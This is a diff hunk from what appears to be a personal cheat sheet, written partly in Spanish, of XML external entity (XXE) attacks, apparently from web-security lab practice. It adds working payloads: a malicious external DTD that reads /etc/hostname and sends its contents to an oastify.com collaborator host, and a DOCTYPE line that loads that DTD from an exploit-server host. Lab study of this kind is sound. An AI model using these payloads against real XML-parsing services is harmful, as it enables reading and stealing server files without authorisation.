@@ -55,10 +55,16 @@ No olvidar llamar la variable &xxe; dentro de <productId>&xxe;<productId/>
 
 - XXE -> Exfiltrate data with .dtd
 ```js
+// Malicious '.dtd' --> Exploit Server
+
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://7jrdg2pt08mm0ai64xh1shmqdhj97zvo.oastify.com?content=%file;'>">
 %eval;
 %exfil;
+
+// XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a5d004d0328c81781062ea10121002a.exploit-server.net/exploit"> %xxe;]>
+
 ```
 
 - XXE -> Exfiltrate data via error messages
